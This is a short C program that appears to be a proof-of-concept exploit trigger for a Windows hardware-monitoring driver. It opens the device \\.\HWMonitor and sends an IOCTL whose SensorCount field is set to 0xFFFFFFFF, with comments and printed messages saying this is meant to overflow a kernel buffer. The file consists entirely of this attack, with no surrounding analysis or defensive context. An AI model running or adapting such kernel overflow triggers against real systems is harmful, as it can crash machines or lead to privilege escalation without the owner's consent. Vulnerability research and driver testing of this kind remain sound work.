#include <windows.h>
#include <stdio.h>

#define DEVICE_PATH "\\\\.\\HWMonitor"
#define IOCTL_CALIBRATE_SENSORS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _CALIBRATION_DATA {
    ULONG SensorCount;
    ULONG CalibrationValues[64];
    CHAR SensorNames[256];
} CALIBRATION_DATA;

int main() {
    HANDLE hDevice = CreateFileA(
        DEVICE_PATH,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf(":: failed to open device: %d\n", GetLastError());
        return 1;
    }
    
    printf(":: Device opened\n");
    
    CALIBRATION_DATA calibData;
    DWORD bytesReturned = 0;
    
    // Setting big buffer to overfloo
    calibData.SensorCount = 0xFFFFFFFF;
    
    for (int i = 0; i < 64; i++) {
        calibData.CalibrationValues[i] = 100 + i;
    }
    
    memset(calibData.SensorNames, 0, sizeof(calibData.SensorNames));
    strcpy_s(calibData.SensorNames, sizeof(calibData.SensorNames), "Sensors");
    
    printf(":: Trying overflow via IOCTL_CALIBRATE_SENSORS...\n");
    
    DeviceIoControl(
        hDevice,
        IOCTL_CALIBRATE_SENSORS,
        &calibData,
        sizeof(CALIBRATION_DATA),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
    
    CloseHandle(hDevice);
    return 0;
}